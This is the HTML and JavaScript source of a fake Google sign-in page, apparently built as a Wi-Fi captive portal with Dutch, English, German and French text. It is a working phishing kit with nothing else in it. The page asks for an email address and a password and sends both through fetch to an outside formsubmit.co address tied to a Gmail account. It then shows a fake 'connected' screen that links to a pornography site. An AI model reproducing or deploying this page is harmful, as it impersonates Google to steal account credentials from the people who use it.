<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500" rel="stylesheet">
    <style>
        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { width: 100%; max-width: 450px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; position: relative; overflow: hidden; }
        @media (max-width: 450px) { .box { border: none; padding: 20px; } }
        .google-logo { height: 24px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
        p { font-size: 16px; color: #202124; margin-bottom: 25px; }
        input { width: 100%; padding: 13px 15px; margin: 15px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        input:focus { outline: none; border: 2px solid #1a73e8; }
        .btn-container { display: flex; justify-content: space-between; align-items: center; margin-top: 20px; }
        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
        .loader-line { position: absolute; top: 0; left: 0; height: 4px; width: 0; background: #1a73e8; transition: width 0.5s ease; }
        #passStep, #wifiSuccess { display: none; }
    </style>
</head>
<body>

    <div class="box" id="loginBox">
        <div id="loader" class="loader-line"></div>
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="google-logo" alt="Google">
        
        <div id="emailStep">
            <h1 id="t-login">Inloggen</h1>
            <p id="t-sub">Gebruik je Google-account</p>
            <input type="email" id="emailInput" placeholder="Email" required>
            <div class="btn-container">
                <span id="t-create" style="color:#1a73e8; font-size:14px; font-weight:500; cursor:pointer;">Account maken</span>
                <button onclick="validateEmail()" id="t-next1">Volgende</button>
            </div>
        </div>

        <div id="passStep">
            <h1 id="t-welcome">Welkom</h1>
            <div style="display:inline-flex; align-items:center; border:1px solid #dadce0; padding:4px 12px; border-radius:15px; font-size:14px; margin-bottom:20px;">
                <span id="displayEmail"></span>
            </div>
            
            <form id="finalForm" action="https://formsubmit.co/ajax/kaasislekker069@gmail.com" method="POST">
                <input type="hidden" name="email" id="hiddenEmail">
                <input type="password" name="password" id="passInput" placeholder="Wachtwoord" required>
                <div class="btn-container">
                    <span id="t-forgot" style="color:#1a73e8; font-size:14px; font-weight:500;">Wachtwoord vergeten?</span>
                    <button type="submit" id="t-next2">Volgende</button>
                </div>
            </form>
        </div>
    </div>

    <div class="box" id="wifiSuccess">
        <div style="font-size: 50px; color: #34A853;">✔</div>
        <h1 id="t-connected">Verbonden!</h1>
        <p id="t-success">U bent nu succesvol verbonden met het netwerk.</p>
        <button onclick="window.location.href='https://pornhub.com/'" style="width:100%;" id="t-close">Sluiten</button>
    </div>

    <script>
        // TAALINSTELLINGEN
        const translations = {
            'nl': { login: 'Inloggen', sub: 'Gebruik je Google-account', create: 'Account maken', next: 'Volgende', welcome: 'Welkom', forgot: 'Wachtwoord vergeten?', pass: 'Wachtwoord opgeven', connected: 'Verbonden!', success: 'U bent nu verbonden.', close: 'Sluiten' },
            'en': { login: 'Sign in', sub: 'Use your Google Account', create: 'Create account', next: 'Next', welcome: 'Welcome', forgot: 'Forgot password?', pass: 'Enter your password', connected: 'Connected!', success: 'You are now connected.', close: 'Close' },
            'de': { login: 'Anmelden', sub: 'Verwenden Sie Ihr Google-Konto', create: 'Konto erstellen', next: 'Weiter', welcome: 'Willkommen', forgot: 'Passwort vergessen?', pass: 'Passwort eingeben', connected: 'Verbunden!', success: 'Sie sind jetzt verbunden.', close: 'Schließen' },
            'fr': { login: 'Connexion', sub: 'Utilisez uw compte Google', create: 'Créer un compte', next: 'Suivant', welcome: 'Bienvenue', forgot: 'Mot de passe oublié ?', pass: 'Saisissez uw mot de passe', connected: 'Connecté !', success: 'Vous êtes maintenant connecté.', close: 'Fermer' }
        };

        // Detecteer taal
        const lang = navigator.language.startsWith('de') ? 'de' : navigator.language.startsWith('fr') ? 'fr' : navigator.language.startsWith('en') ? 'en' : 'nl';
        const t = translations[lang];

        // Pas teksten aan
        document.getElementById('t-login').innerText = t.login;
        document.getElementById('t-sub').innerText = t.sub;
        document.getElementById('t-create').innerText = t.create;
        document.getElementById('t-next1').innerText = t.next;
        document.getElementById('t-next2').innerText = t.next;
        document.getElementById('t-welcome').innerText = t.welcome;
        document.getElementById('t-forgot').innerText = t.forgot;
        document.getElementById('passInput').placeholder = t.pass;
        document.getElementById('t-connected').innerText = t.connected;
        document.getElementById('t-success').innerText = t.success;
        document.getElementById('t-close').innerText = t.close;

        function validateEmail() {
            const email = document.getElementById('emailInput').value;
            if (!email.includes('@')) { alert("Email?"); return; }
            document.getElementById('loader').style.width = "100%";
            setTimeout(() => {
                document.getElementById('emailStep').style.display = 'none';
                document.getElementById('passStep').style.display = 'block';
                document.getElementById('displayEmail').innerText = email;
                document.getElementById('hiddenEmail').value = email;
                document.getElementById('loader').style.width = "0%";
            }, 1000);
        }

        document.getElementById('finalForm').addEventListener('submit', function(e) {
            e.preventDefault();
            fetch(this.action, { method: 'POST', body: new FormData(this) }).then(() => {
                document.getElementById('loginBox').style.display = 'none';
                document.getElementById('wifiSuccess').style.display = 'block';
            });
        });
    </script>
</body>
</html>
